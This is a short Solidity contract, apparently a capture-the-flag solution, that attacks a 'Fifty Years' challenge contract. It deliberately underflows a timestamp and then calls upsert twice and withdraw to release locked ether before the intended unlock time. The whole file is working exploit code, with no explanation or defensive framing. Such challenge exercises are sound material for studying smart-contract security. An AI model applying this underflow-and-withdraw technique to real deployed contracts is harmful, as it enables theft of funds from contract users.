// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IFiftyYearsChallenge {
    function upsert(uint256 index, uint256 timestamp) external payable;

    function withdraw(uint256 index) external;
}

contract FiftyYearsAttack {
    function attack(address target) public payable {
        IFiftyYearsChallenge challenge = IFiftyYearsChallenge(target);
        uint256 timestamp;
        timestamp -= 1 days;
        challenge.upsert{ value: 1 }(10000, timestamp);
        challenge.upsert{ value: 1 }(10000, 0);
        challenge.withdraw(1);
    }

    receive() external payable {}
}